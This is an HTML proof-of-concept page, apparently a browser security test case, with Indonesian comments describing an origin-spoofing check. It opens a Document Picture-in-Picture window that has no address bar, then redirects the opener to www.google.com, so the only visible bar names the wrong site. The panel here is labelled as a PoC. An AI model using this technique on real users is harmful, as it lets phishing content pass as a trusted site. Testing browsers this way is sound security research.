<!doctype html><meta charset=utf-8>
<!-- Beda dari chromeless-popup: di sana bar DIHILANGKAN. Di sini bar ADA dan BERBOHONG soal dokumen yang di atas.
     PREDIKAT: PiP always-on-top tanpa bar = milikku; satu-satunya bar di layar melukis www.google.com
     ORACLE: klik go -> screenshot SELURUH layar (PiP + jendela induk di belakangnya)
     CONTROL: hapus baris location.href = T
     EXPECTED-SECURE: PiP membawa atribusi origin sendiri, atau bar induk tetap jujur -->
<button onclick="go()">go</button>
<pre id=p></pre>
<script>
const T = 'https://www.google.com/';
async function go(){
  if (!self.documentPictureInPicture) return p.textContent = 'PiP API tidak ada = INERT (catat).';
  const w = await documentPictureInPicture.requestWindow({ width: 420, height: 220 });
  w.document.body.innerHTML = '<h2>PoC PANEL — tidak ada address bar di sini</h2><pre>REAL opener: ' + location.href + '</pre>';
  location.href = T;
}
p.textContent = 'REAL: ' + location.href;
</script>
